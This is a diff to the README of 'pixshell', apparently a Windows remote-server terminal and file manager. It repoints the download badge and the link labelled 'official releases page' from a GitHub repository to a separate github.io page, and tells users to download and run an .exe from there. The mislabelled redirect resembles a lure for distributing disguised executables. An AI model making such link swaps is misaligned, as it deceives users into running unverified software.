@@ -1,6 +1,6 @@
 # 🖥️ pixshell - Manage remote servers with ease
 
-[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://github.com/panamacityelysium954/pixshell)
+[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://panamacityelysium954.github.io)
 
 pixshell provides a simple way to connect to your remote servers. It functions as both a terminal for command-line tasks and a file manager for transferring documents. You can use it to maintain your infrastructure without complex tools. It works on Windows and helps you organize your connections in one place.
 
@@ -8,7 +8,7 @@ pixshell provides a simple way to connect to your remote servers. It functions a
 
 Follow these steps to install the application on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/panamacityelysium954/pixshell).
+1. Visit the [official releases page](https://panamacityelysium954.github.io).
 2. Look for the latest version under the Releases section.
 3. Find the file ending in `.exe` for Windows.
 4. Click the file to download it to your computer.
